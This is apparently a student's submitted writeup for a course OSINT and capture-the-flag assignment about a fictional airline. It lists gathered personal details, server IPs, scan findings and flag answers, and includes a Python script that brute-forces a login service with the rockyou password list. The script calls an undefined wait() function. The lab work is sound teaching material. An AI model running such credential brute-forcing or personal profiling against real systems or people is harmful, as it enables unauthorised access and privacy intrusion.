Writeup 2 - OSINT (Open Source Intelligence)
======

Name: *PUT YOUR NAME HERE*
Section: *PUT YOUR SECTION NUMBER HERE*

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement of honor pledge: *PUT YOUR NAME HERE*

## Assignment 2 writeup

### Part 1 (45 pts)

1. Fred Krueger 

2. Fred is 28 years old and lives in Silver Spring, Maryland. He owns Cornerstone Airlines, and has a twitter and instagram account (@kruegster1990 for both). I found the twitter profile by a simple google search, but the instagram profile was only discoverable by searching on the instagram website, which I decided to do based on the knowledge that twitter, instagram, and facebook tend to be the most popular social media sites. Fred also has a strong interest in Pokemon.

3. The ip address for cornerstoneairlines.co is 142.93.118.186, which I found by searching the URL in the centralops domain dossier. 

4. I found a /secret directory by looking at the robots.txt file. There is a flag in the /secret page source file ({fly_th3_sk1es_w1th_u5}).

5. I found the ip address for the admin server for cornerstone airlines (142.93.117.193) by trying to access the admin page, for which the ip address isn't translated.

6. The servers associated with the site are located in New York, which I found bt entering the ip adresses (above) into shodan.io.

7. The servers run on Linux which I  discovered through using nmap.

8. There's a flag in the home page sorce file ({h1dden_fl4g_in_s0urce}). There's also a flag in the DNS records associated with the website ({dns-txt-rec0rd-ftw}), which I also found via centralops domain dossier. I'm pretty sure there is supposed to be a flag on the instagram account, but I wasn't able to find it. I don't know if it was on the picture that told me to look at it on my phone (which I did, and saw nothing that I couldn't see on the website).

### Part 2 (55 pts)

To break into the server, I wrote a brute force program that tries each password from a password dump with a particular username. To be honest I heard the correct username in class, but it certainly was one of the passwords I intended to try (admin, fkrueger, fredkrueger, kruegster1990, etc). The python code used to find the correct password is below:

~~~~
import socket
import time

host = "142.93.117.193" 
port = 1337 
wordlist = "/users/Kaan/Downloads/rockyou.txt" 

def brute_force():


	with open(wordlist) as f:
		for line in f:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))	

			while s.recv(1024) != b'Username: ': #wait for username prompt
				wait(0)	

			s.send(b'kruegster\n')

			while s.recv(1024) != b'Password: ': #wait for pw prompt
				wait(0)

			s.send(bytes(line, 'utf-8'))

			out = s.recv(1024)
			print(out)

			if out == b'Fail\n':
				s.send(b'\n') #terminate connection

			else:
				print('pw found: ')
				print(line)
				quit()

if __name__ == '__main__':
	brute_force()
  
  ~~~~
